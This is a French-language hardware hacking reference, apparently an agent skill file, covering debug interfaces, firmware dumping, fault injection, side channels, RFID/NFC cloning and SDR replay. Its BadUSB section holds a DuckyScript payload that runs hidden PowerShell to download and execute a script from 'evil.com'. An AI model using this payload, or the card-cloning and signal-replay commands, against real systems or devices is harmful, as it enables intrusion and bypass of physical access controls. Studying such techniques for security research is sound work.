---
name: hardware-hacking
description: Hardware Hacking — JTAG/SWD, SPI/I2C/UART, glitching, side-channel, RF/SDR, dump firmware, BadUSB, et exploitation physique de circuits
tags: [hardware, JTAG, SWD, SPI, I2C, UART, glitching, side-channel, SDR, firmware]
version: 1.0
---

# Hardware Hacking

Guide de hacking matériel — des interfaces de debug aux attaques physiques sur circuits et firmware embarqué.

## 1. Identification et Reconnaissance

### PCB Reconnaissance
```bash
# Identifier les points d'intérêt sur un PCB
# - JTAG/SWD : TMS, TCK, TDI, TDO, nTRST, nSRST
# - UART : TX, RX, GND (souvent 3.3V)
# - SPI : MOSI, MISO, SCK, CS
# - I2C : SDA, SCL
# - Power : VCC, GND (entrée + régulateurs)

# Points de test = pads, vias, trous
# Souvent étiquetés : J1, J2, TP1, etc.

# Utiliser multimètre en mode continuité
# - GND = plan large, souvent blindage
# - VCC = connecté à régulateur
# - TX/RX = oscilloscope (3.3V pulses)
```

### Pinout Tools
```bash
# Logic Analyzer (cheap)
# - Saleae (clone) : 24MHz, 8 canaux
# - pulseview + libsigrok
# - Total Phase Beagle : I2C/SPI analysis

# Identification automatique
# - JTAGulator : bruteforce JTAG pins
# - JTAGenum : Arduino-based
# - Bus Pirate : I2C/SPI/1Wire/UART/CAN
```

## 2. Interfaces de Debug

### JTAG (IEEE 1149.1)
```bash
# Signaux : TMS, TCK, TDI, TDO, nTRST (optional), nSRST (optional)
# Fréquence : typique 1-100 MHz
# Voltage : 1.8V, 3.3V (identifier avec oscilloscope)

# Identifier JTAG (JTAGulator)
jtagulator> s
# Brute force pinout
jtagulator> b
jtagulator> S  # Scan bypass mode
jtagulator> I  # IDCODE scan → identifie chip

# Outils
# - OpenOCD : debug + flash
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
> halt
> flash write_image firmware.bin 0x08000000
> reset run

# - UrJTAG : generic JTAG
# - JTAGulator : pinout discovery
```

### SWD (Serial Wire Debug) — ARM Cortex
```bash
# Signaux : SWDIO, SWCLK (2 pins)
# Souvent multiplexé avec JTAG
# Voltage : 1.2-3.3V

# Identifier SWD
# - SWDIO : pull-up (100k)
# - SWCLK : pull-down (100k)
# - Fréquence : ~4MHz

# Outils
# - Black Magic Probe : native SWD
# - ST-Link / ST-Link V2 (clone : 3€)
# - J-Link EDU : full features
# - DAPLink : open source CMSIS-DAP

openocd -f interface/stlink.cfg -f target/stm32h7x.cfg
```

### UART (Serial Console)
```bash
# Signaux : TX, RX, GND (parfois RTS, CTS)
# Baud rates courants : 9600, 19200, 38400, 57600, 115200, 230400, 460800
# Voltage : 3.3V ou 1.8V (rarement 5V)

# Bruteforce baud rate
python3 -c "
import serial
import time
for baud in [9600, 19200, 38400, 57600, 115200, 230400, 460800, 921600]:
    try:
        s = serial.Serial('/dev/ttyUSB0', baud, timeout=1)
        data = s.read(100)
        if data:
            print(f'BAUD {baud}: {data}')
    except: pass
"

# Détection UART avec oscilloscope
# - TX = signal constant au repos (3.3V)
# - RX = flottant (pull-up)
```

### SPI
```bash
# Signaux : SCK, MOSI, MISO, CS
# Fréquence : typique 1-50 MHz
# Mode : CPOL = 0/1, CPHA = 0/1

# Sniff SPI avec Saleae
# Identifier CS (chip select) → actif bas

# SPI flash dump
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r dump.bin
flashrom -p ch341a_spi -r bios.bin  # BIOS/UEFI dump
```

### I2C
```bash
# Signaux : SDA, SCL
# Adresses : 7-bit (0x08-0x77)
# Fréquence : 100kHz (standard), 400kHz (fast), 1MHz (fast+)

# Scanner I2C
i2cdetect -y 1
# Bus Pirate
busPirate> m
# I2C sniff
busPirate> (3)

# Lire EEPROM I2C
i2cdump -y 1 0x50 w  # EEPROM standard 24CXX
```

## 3. Glitching / Fault Injection

### Voltage Glitching
```bash
# Baisser la tension momentanément
# Fait sauter une instruction : bypass check, skip JNZ
# Timing critique : ~10-100 µs après trigger

# Matériel
# - ChipWhisperer Lite (CW1173) : 240€
# - ChipWhisperer Pro (CW1200) : 1500€
# - GlitchKit : DIY Arduino shield
# - Mosfet + pulse generator : DIY (< 50€)

# ChipWhisperer API
import chipwhisperer as cw
scope = cw.scope()
scope.glitch.output = 'glitch_only'
scope.glitch.width = 10E-6  # 10 µs
scope.glitch.offset = 100E-6  # 100 µs after trigger
scope.arm()
scope.glitch.repeat = 10  # Tentatives
```

### Clock Glitching
```bash
# Insérer un pulse clock extra pour sauter instruction
# Plus précis que voltage glitching

# Technique : modifier Phase-Locked Loop
# Double frequency pulse → instruction skip
```

### Electromagnetic Fault Injection (EMFI)
```bash
# Pulse EM focalisé sur le die
# Nécessite : EM probe + pulse generator
# Coût : 500-5000€ (DIY possible)
# Plus difficile à filtrer que voltage glitch
```

## 4. Firmware Dump & Analysis

### Flash Dump (SOIC-8 / WSON-8)
```bash
# Souder ou pogo pins sur flash chip
flashrom -p ch341a_spi -r dump.bin

# Analyse
binwalk -Me dump.bin
strings dump.bin | head -100
hexdump -C dump.bin | head -50
```

### Encrypted / Locked Flash
```bash
# Read protection (RDP) levels
# STM32 : RDP 0 (open), 1 (limited), 2 (permanent)

# Bypass
# - Voltage glitch sur VDD pendant boot
# - Clock glitch sur HSE
# - Analyse EM lors de boot ROM

# STM32 read protection bypass tools
# - Attacker works : "Tearing" attack on STM32 RDP
# - EMFI on RDP check
```

### Firmware Extraction
```
1. Dump flash → binwalk → extracted
2. Analyse strings, check crypto constants
3. Reverse engineer with Ghidra
4. Identify UART/console strings for debug access
5. Exploit debug shell for advanced access
```

## 5. Side-Channel Attacks

### Power Analysis
```bash
# Simple Power Analysis (SPA)
# - Visualiser les opérations (multiplications RSA)
# Identifier AES rounds (10 rounds = 10 spikes)

# Differential Power Analysis (DPA)
# - Statistique sur multiples traces
# - Corrélation key byte

# Tool : ChipWhisperer
```

### EM Emanation
```bash
# Near-field EM probe
# Capturer émissions EM pendant crypto
# Évite les filtres d'alimentation
# Plus sensible que power analysis
```

## 6. BadUSB & HID Attacks

### Rubber Ducky / BadUSB
```bash
# HID keyboard emulation
# Teensy, Arduino Leonardo, Digispark, Flipper Zero
# Écriture automatique : commands, reverse shell, keylogger

# DuckyScript → inject.bin
DUCKY_LANG FR
DELAY 1000
WINDOWS r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Exec Bypass -C "IEX(New-Object Net.WebClient).downloadString('http://evil.com/ps.ps1')"
ENTER
```

### Flipper Zero
```bash
# GPIO : UART, SPI, I2C
# RFID (125kHz + 13.56MHz)
# NFC, iButton, Infrared
# Sub-1GHz (433, 868, 915 MHz)
# BadUSB (Ble)
```

## 7. RFID/NFC

### RFID Cloning (125kHz)
```bash
# EM4100, HID Prox, Indala
# Proxmark3 : read, analyze, clone
pm3 --> lf search
pm3 --> lf em 410x reader
pm3 --> lf em 410x sim --uid <uid>
```

### NFC (13.56MHz)
```bash
# Mifare Classic (CRYPTO1) — cassé
# MIFARE Plus — sécurisé
# Desfire — sécurisé
# NTAG — lecture/écriture libre

# Mifare Classic hack
# - mfoc : nested authentication attack (crack keys)
# - mfcuk : Darkside attack
# - Hardnested : key recovery (Craptev1)

mfoc -O dump.mfd
# Clone with Proxmark
pm3 --> hf mf restore
```

## 8. SDR (Software Defined Radio)

### HackRF One
```bash
# 1 MHz - 6 GHz
# TX/RX : 20 MHz bandwidth

# Analyse de signal
hackrf_transfer -r capture.cfile -f 433920000 -s 2000000 -n 10000000

# Replay attack
hackrf_transfer -t capture.cfile -f 433920000 -s 2000000 -x 40
```

### RTL-SDR
```bash
# 24 MHz - 1.7 GHz
# RX only, 3.2 MHz bandwidth

# Listen to POCSAG (pagers)
rtl_fm -f 169650000 -s 22050 -M fm | aplay -r 22050 -f S16_LE

# ADS-B (aircraft)
dump1090 --interactive
```

## 9. Tools Compendium

| Outil | Interface | Usage principal |
|-------|-----------|----------------|
| **Bus Pirate** | Multi | I2C/SPI/1Wire/UART |
| **JTAGulator** | JTAG/SWD | Pinout discovery |
| **ChipWhisperer** | Multi | Glitching + SCA |
| **HackRF One** | SDR | TX/RX 1MHz-6GHz |
| **Flipper Zero** | Multi | RFID/NFC/GPIO/IR |
| **Proxmark3** | RFID | NFC/RFID analysis |
| **Saleae Logic** | GPIO | Protocol analysis |
| **Black Magic Probe** | SWD/JTAG | Debug + flash |
| **ST-Link V2** | SWD | ARM debug |
| **OpenOCD** | SWD/JTAG | Flash + debug CLI |

## 10. Ressources

- **Hackaday** : https://hackaday.com
- **Flashrom** : https://flashrom.org
- **Bus Pirate** : http://dangerousprototypes.com
- **ChipWhisperer** : https://chipwhisperer.readthedocs.io
- **Proxmark3** : https://github.com/RfidResearchGroup/proxmark3
- **Joe Grand** : Hardware hacking king
- **LiveOverflow HW** : YouTube series
- **CTF HW Challenges** : Hacker101, CSAW, Pwn2Win
- **OSSEM** : https://github.com/zer0yu/Awesome-Hardware-Tools